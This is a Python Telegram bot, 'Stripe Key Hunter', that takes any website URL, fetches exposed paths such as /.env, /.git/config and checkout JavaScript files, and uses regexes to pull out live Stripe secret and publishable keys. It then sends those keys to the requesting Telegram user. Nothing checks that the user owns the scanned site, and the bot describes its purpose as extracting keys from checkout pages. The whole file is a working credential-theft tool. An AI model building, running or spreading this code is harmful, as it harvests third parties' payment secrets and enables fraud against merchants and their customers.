import re
import requests
import os
import logging
from urllib.parse import urlparse
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# === LOGGING ===
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
# Optional: comma-separated telegram user IDs allowed to use /scan
ALLOWED_USER_IDS = os.getenv("ALLOWED_USER_IDS")
if ALLOWED_USER_IDS:
    try:
        ALLOWED_USER_IDS = [int(x.strip()) for x in ALLOWED_USER_IDS.split(",") if x.strip()]
    except ValueError:
        raise ValueError("ALLOWED_USER_IDS must be a comma-separated list of integers (Telegram user IDs)")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN not set in environment variables")

# === HELPERS ===

def _normalize_url(url: str) -> str:
    # Ensure scheme is present and URL is valid
    parsed = urlparse(url)
    if not parsed.scheme:
        url = "https://" + url
        parsed = urlparse(url)
    if not parsed.netloc:
        raise ValueError(f"Invalid URL: {url}")
    return f"{parsed.scheme}://{parsed.netloc}"


def scan_for_keys(url: str) -> dict:
    found = {"pk": [], "sk": []}
    paths = [
        "/",
        "/.env",
        "/config.js",
        "/stripe.js",
        "/checkout.js",
        "/payment.js",
        "/static/js/main.js",
        "/api/config",
        "/.git/config",
    ]

    session = requests.Session()
    session.headers.update({"User-Agent": "StripeKeyHunter/1.0 (+https://github.com/)"})

    base = url.rstrip("/")

    for path in paths:
        full_url = base + path
        try:
            resp = session.get(full_url, timeout=10)
            if resp.status_code == 200:
                text = resp.text or ""
                sk = re.findall(r"sk_live_[A-Za-z0-9]{24,}", text)
                pk = re.findall(r"pk_live_[A-Za-z0-9]{24,}", text)
                if sk:
                    found["sk"].extend(sk)
                if pk:
                    found["pk"].extend(pk)
        except requests.RequestException as e:
            logger.debug("Request to %s failed: %s", full_url, e)
            continue

    # deduplicate while preserving order
    found["sk"] = list(dict.fromkeys(found["sk"]))
    found["pk"] = list(dict.fromkeys(found["pk"]))
    return found


# === COMMANDS ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Stripe Key Hunter Bot active.\n"
        "Send /scan <checkout_url> to extract keys.\n"
        "Example: /scan https://example.com/checkout"
    )


async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if ALLOWED_USER_IDS and user and user.id not in ALLOWED_USER_IDS:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        logger.warning("Unauthorized scan attempt by user %s", user.id if user else None)
        return

    if not context.args:
        await update.message.reply_text("Usage: /scan https://example.com/checkout")
        return

    raw_url = context.args[0]
    try:
        normalized = _normalize_url(raw_url)
    except ValueError:
        await update.message.reply_text(f"Invalid URL: {raw_url}")
        return

    await update.message.reply_text(f"Scanning: {normalized} ...")
    logger.info("User %s requested scan for %s", user.id if user else None, normalized)

    result = scan_for_keys(normalized)

    reply_lines = [f"Scan complete for: {normalized}", ""]
    if result["sk"]:
        reply_lines.append("Secret Keys (sk_live):")
        for k in result["sk"]:
            reply_lines.append(k)
    else:
        reply_lines.append("No sk_live keys found.")

    if result["pk"]:
        reply_lines.append("")
        reply_lines.append("Publishable Keys (pk_live):")
        for k in result["pk"]:
            reply_lines.append(k)
    else:
        reply_lines.append("")
        reply_lines.append("No pk_live keys found.")

    reply = "\n".join(reply_lines)

    # Telegram has a maximum message size; split into chunks if needed
    max_len = 4000
    for i in range(0, len(reply), max_len):
        await update.message.reply_text(reply[i : i + max_len])


# === MAIN ===
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("scan", scan))
    logger.info("Bot starting...")
    app.run_polling()


if __name__ == "__main__":
    main()
